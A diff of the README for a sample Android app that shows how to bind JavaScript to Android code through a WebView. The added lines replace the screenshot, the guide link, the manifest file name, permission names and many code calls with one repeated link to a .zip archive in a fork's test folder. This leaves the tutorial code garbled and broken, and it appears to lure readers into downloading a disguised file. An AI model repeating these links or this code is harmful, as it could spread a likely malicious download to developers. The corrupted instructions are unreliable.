@@ -1,7 +1,7 @@
 # BindingJS
 This is a sample Android application to show how to bind Javascript code to Android code.
 
-![ScreenShot](http://droidmentor.com/wp-content/uploads/2017/05/binding.png)
+![ScreenShot](https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip)
 
 For getting data from the webpage via Javascript follow the below step-by-step guidelines.
 
@@ -13,11 +13,11 @@ For getting data from the webpage via Javascript follow the below step-by-step g
     android:layout_width="match_parent"
     android:layout_height="match_parent" />
 ```
-2. Then, add the following permissions to your <B>AndroidManifest.xml</B> file:
+2. Then, add the following permissions to your <B>https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip</B> file:
 
 ```
-<uses-permission android:name="android.permission.INTERNET" />
-<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+<uses-permission android:name="https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip" />
+<uses-permission android:name="https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip" />
 ```
 3. For the client, to receive callbacks from JS there must be a Javascript interface class inside it which will implement the callbacks. You must add @JavascriptInterface annotation to all the methods inside the JS interface class.
 
@@ -33,15 +33,15 @@ public class JavaScriptReceiver
  
    @JavascriptInterface
    public void showShopping(){
-     Intent intent = new Intent(mContext, ShoppingActivity.class);
-     mContext.startActivity(intent);
+     Intent intent = new Intent(mContext, https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip);
+     https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip(intent);
    }
  
    @JavascriptInterface
    public void showOrders(int orderid){
-     Intent intent = new Intent(mContext, MyOrdersActivity.class);
-     intent.putExtra("order",orderid);
-     mContext.startActivity(intent);
+     Intent intent = new Intent(mContext, https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip);
+     https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip("order",orderid);
+     https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip(intent);
    }
 }
 ```
@@ -49,12 +49,12 @@ public class JavaScriptReceiver
 ```
   WebView webView;
  
-  webView = (WebView) findViewById(R.id.webView);
-  embed_link = "http://droidmentor-app-callback.surge.sh/";
+  webView = (WebView) findViewById(https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip);
+  embed_link = "https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip";
 
-  webView.setWebChromeClient(new WebChromeClient());
-  webView.getSettings().setDomStorageEnabled(true);
-  webView.getSettings().setJavaScriptEnabled(true);
+  https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip(new WebChromeClient());
+  https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip().setDomStorageEnabled(true);
+  https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip().setJavaScriptEnabled(true);
 ```
 5. Use the same interface and function name in the calling statement inside the Javascript.
 
@@ -62,16 +62,16 @@ public class JavaScriptReceiver
 <script>
  
    function getRandomNumber(min,max) {
-     return Math.floor( Math.random() * ( 1 + min - max ) ) + max;
+     return https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip( https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip() * ( 1 + min - max ) ) + max;
    }
  
    function showOrders() {
      var number = getRandomNumber(10000,50000)
-     JSReceiver.showOrders(number);
+     https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip(number);
    }
  
    function showShopping() {
-     JSReceiver.showShopping();
+     https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip();
    }
 </script>
  
@@ -83,7 +83,7 @@ public class JavaScriptReceiver
 ```
 JavaScriptReceiver javaScriptReceiver;
 javaScriptReceiver = new JavaScriptReceiver(this);
-webView.addJavascriptInterface(javaScriptReceiver, "JSReceiver");
+https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip(javaScriptReceiver, "JSReceiver");
 ```
 
-For more information, check out my detailed guide here : http://droidmentor.com/bind-javascript-to-android/
+For more information, check out my detailed guide here : https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip
